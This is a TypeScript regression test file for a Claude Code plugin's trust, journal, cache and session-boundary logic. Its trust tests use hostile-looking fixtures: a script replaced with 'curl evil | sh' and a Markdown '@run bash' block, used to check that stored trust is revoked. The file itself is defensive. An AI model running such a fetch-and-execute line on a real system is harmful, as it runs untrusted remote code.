// Regression tests for the session-side fixes of the 2026-10-06 review (hooks-guard): S1/L09 trust bound to a sha256 of
// the executable surface, M25 needsTrust, M16/R1 journal flush that keeps other writers' lines, M14/R2 bounded cache
// in $.store, L02 schema error keeps the cursor-rules switch, M17 /resume, M26/L10 subagent and vetoed compactions.
import { describe, expect } from 'claude-code/testing'

import { ROOT, RULES, mountRepo, test } from './testkit.ts'
import { type Io, newRuntime, readOptions, type Runtime } from './ctx.ts'
import { INITIAL, type State } from './state.ts'
import { commandsHash, invalidateSurface, needsTrust, rebindAfterBuild, sourcesHash, trustState } from './layers/trust.ts'
import { LOG_FILE, LOG_ROTATED, flushJournal, pushFileEntry } from './layers/journal.ts'
import { CACHE_INDEX, cachePut } from './layers/host.ts'
import { loadGateConfig } from './layers/config.ts'
import type { GateConfig } from '../packages/core/src/types.ts'

const SLOW = { timeoutMs: 20_000 }
const ORIGIN = { kind: 'composer' } as const
const MSGS = [{ role: 'user', text: 'привіт', toolUses: [] }]
const CONFIG = {
  groups: { frontend: ['skill:react-*'], backend: ['skill:prisma'] },
  tiers: { premium: { groups: [] }, standard: { groups: [] }, quick: { groups: [] } },
  profiles: { frontend: { groups: ['frontend'] }, backend: { groups: ['backend'] } },
  classify: { mode: 'shadow', recheckOn: ['compact'] },
}

interface Fake { io: Io; files: Map<string, { text: string; mtimeMs: number }>; store: Map<string, unknown>; toasts: string[]; unreadable: Set<string> }

/** A port over in-memory files and store (absolute paths under ROOT), enough for trust, journal and cache. */
function fake(files: Record<string, string> = {}): Fake {
  const state: State = { ...INITIAL }
  const f = new Map(Object.entries(files).map(([k, v]) => [`${ROOT}/${k}`, { text: v, mtimeMs: 1 }]))
  const store = new Map<string, unknown>()
  const toasts: string[] = []
  const unreadable = new Set<string>()
  const isDir = (p: string): boolean => [...f.keys()].some((k) => k.startsWith(p.replace(/\/$/, '') + '/'))
  const io = {
    read: async (k: keyof State) => state[k],
    update: async (k: keyof State, fn: (v: unknown) => unknown) => ((state as Record<string, unknown>)[k] = fn(state[k])),
    fs: {
      read: async (p: string) => { if (unreadable.has(p)) throw new Error('over 4 MiB'); const x = f.get(p); if (!x) throw new Error(`ENOENT ${p}`); return x.text },
      write: async (p: string, text: string) => { f.set(p, { text, mtimeMs: (f.get(p)?.mtimeMs ?? 0) + 1 }) },
      exists: async (p: string) => f.has(p) || unreadable.has(p) || isDir(p),
      list: async (p: string) => {
        const pre = p.replace(/\/$/, '') + '/'
        const out = new Map<string, { name: string; kind: string; size: number; mtimeMs: number; isLink: boolean }>()
        for (const [k, v] of f) {
          if (!k.startsWith(pre)) continue
          const rest = k.slice(pre.length)
          const i = rest.indexOf('/')
          if (i < 0) out.set(rest, { name: rest, kind: 'file', size: v.text.length, mtimeMs: v.mtimeMs, isLink: false })
          else out.set(rest.slice(0, i), { name: rest.slice(0, i), kind: 'dir', size: 0, mtimeMs: 0, isLink: false })
        }
        return [...out.values()]
      },
    },
    session: { repo: async () => ({ root: ROOT, remote: null }), root: async () => ROOT, model: async () => 'claude-sonnet-4-5', id: async () => 's1', usage: async () => ({ context: { window: 200_000 } }) },
    store: { get: async (k: string) => store.get(k), set: async (k: string, v: unknown) => { store.set(k, v) }, delete: async (k: string) => { store.delete(k) }, keys: async () => [...store.keys()] },
    env: { os: async () => undefined, home: async () => undefined },
    ui: { toast: (t: string) => { toasts.push(t) }, log: () => undefined },
  }
  return { io: io as unknown as Io, files: f, store, toasts, unreadable }
}

function runtime(cfg?: GateConfig): Runtime {
  const rt = newRuntime(readOptions({}))
  rt.root = ROOT
  rt.ready = true
  rt.config = cfg
  rt.cfg = cfg ?? ({} as GateConfig)
  return rt
}

describe('trust (S1, L09, M25)', () => {
  test('commandsHash is a sha256 and covers module and file providers', async () => {
    const a = commandsHash({ providers: { m: { kind: 'module', path: 'lib/safe.ts' } } } as unknown as GateConfig)
    const b = commandsHash({ providers: { m: { kind: 'module', path: 'lib/evil.ts' } } } as unknown as GateConfig)
    expect(a).toMatch(/^[0-9a-f]{64}$/)
    expect(a === b).toBe(false)
  })

  test('a stored decision holds until the executable code changes (lib, scripts, Markdown with @run)', async () => {
    const files = {
      '.claude/prompt/main.md': '---\nid: main\n---\nтекст',
      '.claude/prompt/lib/x.ts': 'export default 1',
      '.claude/prompt/scripts/s.sh': 'echo 1',
    }
    const p = fake(files)
    const rt = runtime({} as GateConfig)
    const cases: [string, string, 'trusted' | 'unknown'][] = [
      ['.claude/prompt/main.md', '---\nid: main\n---\nінший текст', 'trusted'],
      ['.claude/prompt/main.md', '---\nid: main\n---\n@run bash\necho pwn\n@end', 'unknown'],
      ['.claude/prompt/lib/x.ts', 'export default process.exit()', 'unknown'],
      ['.claude/prompt/scripts/s.sh', 'curl evil | sh', 'unknown'],
      ['.claude/prompt/lib/new.mjs', 'export default 2', 'unknown'],
    ]
    for (const [path, text, want] of cases) {
      // Trust the current state, then change one file.
      rt.trustCache = undefined
      rt.trustSurface = undefined
      const h = (await trustState(p.io, rt), rt.trustCache!.hash)
      p.store.set(`trust:${ROOT}|`, { decision: 'trusted', commandsHash: h, at: 1 })
      rt.trustCache = undefined
      expect(await trustState(p.io, rt)).toBe('trusted')
      rt.trustAsked = true
      p.files.set(`${ROOT}/${path}`, { text, mtimeMs: Math.random() * 1e9 })
      invalidateSurface(rt)
      expect([path, await trustState(p.io, rt)]).toEqual([path, want])
      if (want === 'unknown') expect(rt.trustAsked).toBe(false) // asked again on the next prompt
    }
  })

  test('S1: the .compiled/ a trusted build writes keeps the decision; a source edit during the build does not', async () => {
    const p = fake({ '.claude/prompt/main.tsx': 'export default <Prompt/>' })
    const rt = runtime({} as GateConfig)
    const h = (await trustState(p.io, rt), rt.trustCache!.hash)
    p.store.set(`trust:${ROOT}|`, { decision: 'trusted', commandsHash: h, at: 1 })
    rt.trustCache = undefined
    expect(await trustState(p.io, rt)).toBe('trusted')
    // The build: sources hashed before it, then .compiled/ with a run node appears.
    const before = await sourcesHash(p.io, rt)
    p.files.set(`${ROOT}/.claude/prompt/.compiled/main.json`, { text: '{"t":"run","code":"x"}', mtimeMs: 5 })
    await rebindAfterBuild(p.io, rt, before)
    rt.trustCache = undefined
    rt.trustAsked = true
    invalidateSurface(rt)
    expect(await trustState(p.io, rt)).toBe('trusted')
    expect(rt.trustAsked).toBe(true)
    // A source changed while the build ran: no rebind, asked again.
    const before2 = await sourcesHash(p.io, rt)
    p.files.set(`${ROOT}/.claude/prompt/main.tsx`, { text: 'export default <Prompt><Run/></Prompt>', mtimeMs: 6 })
    p.files.set(`${ROOT}/.claude/prompt/.compiled/main.json`, { text: '{"t":"run","code":"y"}', mtimeMs: 7 })
    await rebindAfterBuild(p.io, rt, before2)
    invalidateSurface(rt)
    expect(await trustState(p.io, rt)).toBe('unknown')
  })

  test('S1: a surface listing cut at the file cap never reuses a stored «trusted»; an unreadable file still changes the hash', async () => {
    const files: Record<string, string> = {}
    for (let i = 0; i < 410; i++) files[`.claude/prompt/lib/f${String(i).padStart(3, '0')}.ts`] = `export default ${i}`
    files['.claude/prompt/lib/zz/evil.ts'] = 'export default 0' // past the cap: never listed, never hashed
    const p = fake(files)
    const rt = runtime({} as GateConfig)
    const h = (await trustState(p.io, rt), rt.trustCache!.hash)
    p.store.set(`trust:${ROOT}|`, { decision: 'trusted', commandsHash: h, at: 1 })
    rt.trustCache = undefined
    expect(await trustState(p.io, rt)).toBe('unknown')
    const q = fake({ '.claude/prompt/lib/big.ts': 'x' })
    const rt2 = runtime({} as GateConfig)
    q.unreadable.add(`${ROOT}/.claude/prompt/lib/big.ts`)
    const h1 = (await trustState(q.io, rt2), rt2.trustCache!.hash)
    q.files.set(`${ROOT}/.claude/prompt/lib/big.ts`, { text: 'xy', mtimeMs: 9 })
    rt2.trustCache = undefined
    invalidateSurface(rt2)
    await trustState(q.io, rt2)
    expect(rt2.trustCache!.hash === h1).toBe(false)
  })

  test('M25: classify/brief cli providers and module providers need trust', async () => {
    const cli = { kind: 'cli', command: ['node', 'c.js'] }
    const cases: [Partial<GateConfig>, boolean][] = [
      [{}, false],
      [{ classify: { mode: 'auto', provider: cli } } as Partial<GateConfig>, true],
      [{ brief: { provider: cli } } as Partial<GateConfig>, true],
      [{ providers: { m: { kind: 'module', path: 'tools/m.mjs' } } } as Partial<GateConfig>, true],
      [{ providers: { f: { kind: 'file', path: 'r.json' } } } as Partial<GateConfig>, false],
      [{ classify: { mode: 'auto', provider: 'builtin' } } as Partial<GateConfig>, false],
    ]
    for (const [cfg, want] of cases) expect([cfg, needsTrust(cfg as GateConfig, false, false)]).toEqual([cfg, want])
  })
})

describe('journal (M16/R1)', () => {
  const entry = (n: number) => ({ ts: n, turn: 0, trigger: 'x', tier: 'standard', enabled: [], disabled: [], reason: [], kind: 'debug' })

  test('every flush keeps what other writers appended in between', async () => {
    const p = fake({ [LOG_FILE]: '{"event":"runner","n":1}\n' })
    const rt = runtime({ log: { file: true } } as GateConfig)
    await pushFileEntry(p.io, rt, entry(1))
    const path = `${ROOT}/${LOG_FILE}`
    p.files.set(path, { text: p.files.get(path)!.text + '{"event":"runner","n":2}\n', mtimeMs: 50 })
    await pushFileEntry(p.io, rt, entry(2))
    const text = p.files.get(path)!.text
    expect(text).toContain('"n":1')
    expect(text).toContain('"n":2')
    expect(text.split('\n').filter(Boolean)).toHaveLength(4)
  })

  test('an existing file that cannot be read is never overwritten', async () => {
    const p = fake()
    const path = `${ROOT}/${LOG_FILE}`
    p.unreadable.add(path)
    const rt = runtime({ log: { file: true } } as GateConfig)
    await pushFileEntry(p.io, rt, entry(1))
    expect(p.files.has(path)).toBe(false)
    expect(p.toasts.some((t) => t.includes('не читається'))).toBe(true)
    p.unreadable.delete(path)
    await flushJournal(p.io, rt) // readable again (absent): the kept entry is written
    expect(p.files.get(path)?.text ?? '').toContain('"ts":1')
  })

  test('past the line cap the oldest lines rotate into gate.log.1.jsonl instead of being cut', async () => {
    const old = Array.from({ length: 5003 }, (_, i) => `{"n":${i}}`).join('\n') + '\n'
    const p = fake({ [LOG_FILE]: old })
    const rt = runtime({ log: { file: true } } as GateConfig)
    await pushFileEntry(p.io, rt, entry(1))
    const main = p.files.get(`${ROOT}/${LOG_FILE}`)!.text
    const rotated = p.files.get(`${ROOT}/${LOG_ROTATED}`)?.text ?? ''
    expect(rotated.startsWith('{"n":0}\n')).toBe(true)
    expect(main.split('\n').length).toBeLessThan(5002)
    expect((rotated + main).match(/"n":/g)?.length).toBe(5003)
  })

  test('many flushes past the cap lose nothing beyond one generation', async () => {
    const p = fake()
    const rt = runtime({ log: { file: true } } as GateConfig)
    const total = 7_000
    for (let i = 0; i < total; i++) await pushFileEntry(p.io, rt, entry(i), { buffered: true })
    await flushJournal(p.io, rt)
    const main = p.files.get(`${ROOT}/${LOG_FILE}`)!.text
    const rotated = p.files.get(`${ROOT}/${LOG_ROTATED}`)?.text ?? ''
    const ts = (t: string) => (t.match(/"ts":\d+/g) ?? []).map((x) => Number(x.slice(5)))
    const kept = [...ts(rotated), ...ts(main)]
    // Contiguous up to the newest entry, and at least one full generation (FILE_MAX_LINES / 2 + the rest) kept.
    expect(kept[kept.length - 1]).toBe(total - 1)
    expect(kept.every((v, i) => i === 0 || v === kept[i - 1] + 1)).toBe(true)
    expect(kept.length).toBeGreaterThanOrEqual(5000)
  })
})

describe('$.store cache budget (M14/R2)', () => {
  test('cache entries are evicted oldest first under the budget; trust and data keys are never touched; unindexed cache keys are swept', async () => {
    const p = fake()
    const rt = runtime()
    p.store.set('trust:/repo|', { decision: 'trusted' })
    p.store.set('data:/repo|', { k: 1 })
    p.store.set('cache:/repo|:legacy', { value: 'x'.repeat(1000), at: 1 })
    const big = 'y'.repeat(60_000)
    for (let i = 0; i < 40; i++) await cachePut(p.io, rt, `cache:/repo|:k${i}`, { value: big, at: i })
    const cacheKeys = [...p.store.keys()].filter((k) => k.startsWith('cache:'))
    const total = cacheKeys.reduce((n, k) => n + JSON.stringify(p.store.get(k)).length, 0)
    expect(total).toBeLessThan(1_600_000)
    expect(cacheKeys).toContain('cache:/repo|:k39')
    expect(cacheKeys).not.toContain('cache:/repo|:k0')
    expect(cacheKeys).not.toContain('cache:/repo|:legacy')
    expect(p.store.has('trust:/repo|')).toBe(true)
    expect(p.store.has('data:/repo|')).toBe(true)
    expect(Object.keys((p.store.get(CACHE_INDEX) as { entries: Record<string, unknown> }).entries).sort()).toEqual(cacheKeys.sort())
  })
})

describe('config (L02)', () => {
  test('a schema error keeps a disabled cursor-rules layer off', async () => {
    const p = fake({ '.claude/gate.json': JSON.stringify({ cursorRules: { enabled: false }, classify: { mode: 'apply' } }) })
    const rt = runtime()
    await loadGateConfig(p.io, rt)
    expect(rt.config).toBeUndefined()
    expect(rt.disabled.rules).toBe('cursorRules.enabled: false')
  })
})

describe('conversation boundaries (M17, M26, L10)', () => {
  test('M17: /resume is a new conversation: read-before-write asks for a fresh Read', SLOW, async ($, on) => {
    const cfg = { ...CONFIG, gates: [{ name: 'read-before-write', on: 'write', builtin: true }] }
    mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(cfg), 'src/a.ts': 'x' } })
    on('tool.call', () => ({ result: 'ok' }) as never)
    on('classic.SessionStart', () => ({}) as never)
    const edit = (id: string) => $.tool.call({ tool: 'Edit', tool_use_id: id, file_path: `${ROOT}/src/a.ts`, old_string: 'x', new_string: 'y' } as never)
    await $.tool.call({ tool: 'Read', tool_use_id: 'r1', file_path: `${ROOT}/src/a.ts` } as never)
    expect((await edit('e1')).deny).toBeUndefined()
    await $.classic.SessionStart({ source: 'resume' } as never)
    expect((await edit('e2')).deny).toContain('read-before-write')
  })

  test('M26/L10: a subagent compaction and a vetoed one do not reclassify the main loop; a real one does', SLOW, async ($, on) => {
    const repo = mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(CONFIG), ...RULES }, complete: () => '{"profile":"backend","confidence":0.9}' })
    on('prompt.submit', ($, e) => ({ text: e.text }))
    let veto = false
    const instructions: (string | undefined)[] = []
    on('session.compact', ($, e) => {
      instructions.push(e.instructions)
      return (veto ? { skip: 'заборонено' } : { messages: e.messages }) as never
    })
    await $.prompt.submit({ text: 'додай таблицю', wait: false, origin: ORIGIN })
    await $.prompt.submit({ text: 'ще одна', wait: false, origin: ORIGIN })
    const before = repo.completes.length
    await $.session.compact({ trigger: 'auto', agentId: 'a1', instructions: 'субагент', messages: MSGS } as never)
    expect(instructions[0]).toBe('субагент') // main-loop keep-instructions stay out of a subagent's summary
    await $.prompt.submit({ text: 'після компакції субагента', wait: false, origin: ORIGIN })
    expect(repo.completes.length).toBe(before)
    veto = true
    await $.session.compact({ trigger: 'manual', messages: MSGS } as never)
    await $.prompt.submit({ text: 'після вето', wait: false, origin: ORIGIN })
    expect(repo.completes.length).toBe(before)
    veto = false
    await $.session.compact({ trigger: 'manual', messages: MSGS } as never)
    await $.prompt.submit({ text: 'після компакції', wait: false, origin: ORIGIN })
    expect(repo.completes.length).toBe(before + 1)
  })
})

describe('userConfig (S14)', () => {
  test('another plugin may not widen trust; the person in /config may', SLOW, async ($, on) => {
    mountRepo(on, { files: { '.claude/gate.json': JSON.stringify(CONFIG) } })
    on('config.set', ($, e) => ({ value: e.value }))
    const set = (key: string, value: string | boolean, origin: { kind: 'composer' } | { kind: 'plugin'; name: string }) =>
      $.config.set({ key, value, previous: 'ask', provider: { plugin: 'context-gate', tier: 'community' }, origin } as never)
    expect('deny' in (await set('context-gate.trustBuild', 'always', { kind: 'plugin', name: 'other' }))).toBe(true)
    expect('deny' in (await set('context-gate.allowScripts', true, { kind: 'plugin', name: 'other' }))).toBe(true)
    expect('deny' in (await set('context-gate.trustBuild', 'never', { kind: 'plugin', name: 'other' }))).toBe(false)
    expect('deny' in (await set('context-gate.trustBuild', 'always', { kind: 'composer' }))).toBe(false)
  })
})
